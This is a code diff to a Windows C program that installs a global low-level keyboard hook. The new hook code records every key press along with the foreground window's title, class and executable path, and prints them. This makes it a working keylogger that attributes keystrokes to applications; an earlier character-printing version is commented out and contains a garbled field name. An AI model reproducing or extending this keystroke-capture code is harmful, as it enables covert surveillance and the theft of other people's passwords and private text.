@@ -15,10 +15,11 @@
 
 #include <windows.h>
 
+#include <Psapi.h>
 
 
+#pragma comment (lib,"Psapi.lib")
 #pragma comment(lib, "User32.lib")
-
 
 
 DWORD g_tid =0;
@@ -38,14 +39,35 @@ BOOL CALLBACK con_handler(DWORD g_tid)
 LRESULT CALLBACK kb_proc(int code, WPARAM w, LPARAM l)
 {
     PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)l;
+	
+	if (code==HC_ACTION && w==WM_KEYDOWN)
+	{
+		HWND hWnd = GetForegroundWindow();
+		if (hWnd != INVALID_HANDLE_VALUE)
+		{ 
+			char name[100]={0};
+			char text[100]={0};
+			char path[100]={0};
+			int n = GetClassName(hWnd, name, 100);
+			int m = GetWindowText(hWnd, text, 100);
+			DWORD pid;
+			GetWindowThreadProcessId(hWnd,&pid);
+			HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+			GetModuleFileNameEx(handle,NULL,path,100);
+			printf("[%ld] %s %d,%s; %d,%s =>%x\n", pid,path,n,name,m,text,p->vkCode);
+		}
+		
+	}
+/*
 	if (((w == WM_KEYDOWN) && ((GetKeyState(VK_CAPITAL) &1) || (GetKeyState(VK_SHIFT) &1))) 
-		&& (((p->vkCode >64) && (p->vkCode <91)) || ((p->vkCode >47) && (p->vkCode <58)))){
+		&& (((p->vkCode >64) && (p->vkCode <91)) || ((p->asdasdvkCode >47) && (p->vkCode <58)))){
         printf("You press %c ", p->vkCode);
     }else if ((w == WM_KEYDOWN) && ((p->vkCode >64) && (p->vkCode <91))){
         printf("You press %c ", p->vkCode +32);  
     }else if ((w == WM_KEYDOWN) && ((p->vkCode >47) && (p->vkCode <58))){
         printf("You press %c ", p->vkCode);   
     }
+	*/
 	return CallNextHookEx(g_hook, code, w, l);
 }
 
